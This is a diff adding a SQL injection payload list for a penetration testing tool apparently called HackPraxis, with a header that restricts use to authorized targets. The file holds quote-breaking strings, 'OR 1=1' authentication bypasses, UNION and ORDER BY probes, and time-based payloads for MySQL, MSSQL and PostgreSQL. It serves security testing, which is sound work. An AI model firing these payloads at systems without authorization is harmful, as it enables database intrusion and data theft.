@@ -1,0 +1,30 @@
+# HackPraxis manual SQLi test payloads (curl engine).
+# Injected into the FUZZ point; HackPraxis flags a response containing a known
+# SQL error signature (error-based SQLi). For thorough, automated testing use
+# the sqlmap engine. Authorized targets only.
+'
+"
+`
+')
+")
+';
+' OR '1'='1
+' OR '1'='1'-- -
+' OR 1=1-- -
+" OR "1"="1
+" OR 1=1-- -
+') OR ('1'='1
+') OR 1=1-- -
+' OR 'a'='a
+admin'-- -
+admin' #
+1' ORDER BY 1-- -
+1' ORDER BY 10-- -
+1' UNION SELECT NULL-- -
+1' UNION SELECT NULL,NULL-- -
+1 AND 1=1
+1 AND 1=2
+' AND SLEEP(5)-- -
+'; WAITFOR DELAY '0:0:5'-- -
+' OR pg_sleep(5)-- -
+%27%20OR%20%271%27%3D%271
